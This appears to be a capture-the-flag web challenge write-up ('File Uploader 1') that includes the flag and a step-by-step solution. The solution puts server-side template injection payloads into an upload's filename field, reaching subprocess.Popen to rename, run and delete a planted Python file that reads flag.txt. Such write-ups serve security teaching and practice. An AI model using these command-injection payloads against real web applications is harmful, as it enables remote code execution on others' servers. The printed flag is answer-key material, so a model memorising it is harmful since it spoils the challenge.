# File Uploader 1

**Author**: SmartOinker

**Category**: Web

Flag: `SEE{y0U_6yPa55Ed_FuNny_55t1_f1lTer5}`

## Description

A place where you can upload files? But there are so many strict filters!!! How can you possibly bypass them??

Note: On remote, files are cleaned up every minute.

## Difficulty

Easy

## Deployment

`docker-compose up`

## Solution
### Step 1:
Upload a file named `sol.png`, containing the following lines:
```
f = open("flag.txt", "r")
print(f.read())
```

### Step 2:
Submit an empty file named `.php` and edit post request to set `filename="{% print( 1.__class__.mro()[1].__subclasses__() )%}"`

### Step 3:
Copy the string in browser and run the following in python interactive console
```
a = """broswer string"""
b = a.split(", ")
b.index("<class 'subprocess.Popen'>")-->returns 394
```

### Step 4:
set `filename="{% print( 1.__class__.mro()[1].__subclasses__()[394]('mv static/<uid>.png static/a.py',shell=True,stdout=-1).communicate()[0].strip() )%}.php"` to rename your uploaded `sol.png`

then set `filename="{% print( 1.__class__.mro()[1].__subclasses__()[394]('python static/a.py',shell=True,stdout=-1).communicate()[0].strip() )%}.php"` to run the renamed python file

### Step 5:
set `filename="{% print( 1.__class__.mro()[1].__subclasses__()[394]('rm static/a.py',shell=True,stdout=-1).communicate()[0].strip() )%}.php"` to prevent your solution from being stolen
